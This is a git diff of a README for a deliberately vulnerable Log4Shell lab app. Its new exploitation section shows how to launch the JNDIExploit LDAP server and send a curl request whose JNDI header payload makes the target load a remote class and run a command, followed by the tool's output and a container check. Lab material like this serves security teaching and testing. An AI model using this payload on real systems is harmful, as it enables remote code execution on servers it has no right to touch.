@@ -11,61 +11,66 @@ It uses Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and the JDK 1.
 Run it:
 
 ```bash
-docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
 ```
 
 Build it yourself (you don't need any Java-related tooling):
 
 ```bash
 docker build . -t vulnerable-app
-docker run -p 8080:8080 vulnerable-app
+docker run -p 8080:8080 --name vulnerable-app vulnerable-app
 ```
 
-## Exploitation
+## Exploitation steps
 
-First, download JNDIExploit from [here](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2). Run the jar to launch the exploit LDAP server from an IP that the application can reach:
+*Note: This is highly inspired from the original [LunaSec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/). **Run at your own risk, preferably in a VM in a sandbox environment**.*
+
+* Use [JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) to spin up a malicious LDAP server
 
 ```bash
-java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <ldap-server-ip> -p <http-port>
+wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
+unzip JNDIExploit.v1.2.zip
+java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
 ```
-Confirm the exploit by running:
+
+* Then, trigger the exploit using:
 
 ```bash
-curl <application-ip>:8080 -H 'X-Api-Version: ${jndi:ldap://<ldap-server-ip>:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9vd25lZC50eHQ=}'
+# will execute 'touch /tmp/pwned'
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
 ```
-The base64 value decodes to `touch /tmp/owned.txt`. 
 
-You will see similar output from JNDIExploit like below:
+* Notice the output of JNDIExploit, showing it has sent a malicious LDAP response and served the second-stage payload:
 
-```bash
-root@2111:~/# java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <ldap-server-ip> -p 8888
+```
 [+] LDAP Server Start Listening on 1389...
 [+] HTTP Server Start Listening on 8888...
-[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9vd25lZC50eHQ=
+[+] Received LDAP Query: Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo
 [+] Paylaod: command
-[+] Command: touch /tmp/owned.txt
-[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9vd25lZC50eHQ= with basic remote reference payload
-[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9vd25lZC50eHQ= redirecting to http://<ldap-server-ip>:8888/ExploitDRbp2Hes0L.class
-[+] New HTTP Request From /127.0.0.1:34010  /ExploitDRbp2Hes0L.class
-[+] Receive ClassRequest: ExploitDRbp2Hes0L.class
+[+] Command: touch /tmp/pwned
+
+[+] Sending LDAP ResourceRef result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo with basic remote reference payload
+[+] Send LDAP reference result for Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo redirecting to http://192.168.1.143:8888/Exploitjkk87OnvOH.class
+[+] New HTTP Request From /192.168.1.143:50119  /Exploitjkk87OnvOH.class
+[+] Receive ClassRequest: Exploitjkk87OnvOH.class
 [+] Response Code: 200
 ```
 
-Now check the `/tmp` folder inside the docker container and the text file `owned.txt` should be there:
+* To confirm that the code execution was successful, notice that the file `/tmp/pwned.txt` was created in the container running the vulnerable application:
 
-```sh
-root@2111:~/# docker ps
-CONTAINER ID   IMAGE       COMMAND                  CREATED              STATUS              PORTS                                       NAMES
-efebc918d9cb   vulnerable-app   "java -jar /app/spri…"   About a minute ago   Up About a minute   0.0.0.0:8080->8080/tcp, :::8080->8080/tcp   vulnerable-app
-
-root@2111:~/# docker exec -it efebc918d9cb ash   
-/ # ls /tmp
-hsperfdata_root
-owned.txt
-tomcat-docbase.8080.2415120533529983821
-tomcat.8080.1416539772670722454
+```
+$ docker exec vulnerable-app ls /tmp
+...
+pwned
+...
 ```
 
 ## Reference
 
 https://www.lunasec.io/docs/blog/log4j-zero-day/
+https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/
+
+## Contributors
+
+[@christophetd](https://twitter.com/christophetd)
+[@rayhan0x01](https://twitter.com/rayhan0x01)
